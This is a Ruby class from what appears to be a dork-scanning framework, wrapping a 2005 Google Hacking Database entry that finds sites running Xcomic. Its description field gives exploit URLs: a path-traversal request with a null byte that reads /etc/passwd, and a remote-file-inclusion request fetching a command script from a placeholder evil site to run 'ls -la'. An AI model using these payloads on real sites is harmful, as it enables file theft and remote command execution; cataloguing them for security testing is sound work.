module Dorks
   class Dork1096 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1096",
            ghdb_url: "https://www.exploit-db.com/ghdb/1096",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-09-08",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by Xcomic"
EDORK
            description: <<~EDESC
"Powered by xcomic"this is a recent exploit, you can retrieve any file on target systemby using "../" chars and null byte (%00), example:http://target/path_to_xcomic/initialize.php?xcomicRootPath=../../../../etc/passwd%00or launch commands:http://target/path_to_xcomic/initiailze.php?xcomicRootPath=http://[evil_site]/cmd.gif?command=ls%20-la%00where cmd.gif is a file like this:I have read an advisory copy here: http://forum.ccteam.ru/archive/index.php/t-57.html
EDESC
         })

      end
   end
end
